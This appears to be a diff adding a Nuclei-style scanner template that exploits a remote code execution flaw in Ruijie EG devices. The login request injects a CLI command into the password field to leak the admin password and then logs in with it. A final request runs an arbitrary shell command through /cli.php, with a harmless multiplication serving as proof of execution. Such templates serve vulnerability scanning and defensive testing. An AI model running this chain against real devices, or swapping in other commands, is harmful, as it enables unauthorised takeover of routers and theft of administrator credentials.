@@ -1,0 +1,78 @@
+id: ruijie-eg-cli-rce
+info:
+  name: Ruijie Eg CLI Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: rce
+  description: |
+    Exploits a remote code execution vulnerability in Ruijie Eg CLI.
+variables:
+  r1: "{{rand_int(8000, 10000)}}"
+  r2: "{{rand_int(8000, 10000)}}"
+http:
+  - raw:
+      - |
+        POST /login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username=admin&password=admin?show+webmaster+user
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "content-type"
+          - "text/json"
+    extractors:
+      - type: regex
+        group: 1
+        regex:
+          - '{"data":".*admin\\s?(?P<password>[^\\\\"]*)'
+
+  - raw:
+      - |
+        POST /login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username=admin&password={{password}}
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "content-type"
+          - "text/json"
+          - "Set-Cookie"
+          - "user=admin"
+      - type: word
+        part: body
+        words:
+          - '{"data":"0","status":1}'
+
+  - raw:
+      - |
+        POST /cli.php?a=shell HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        notdelay=true&command=expr {{r1}} * {{r2}}
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{to_number(r1) * to_number(r2)}}"
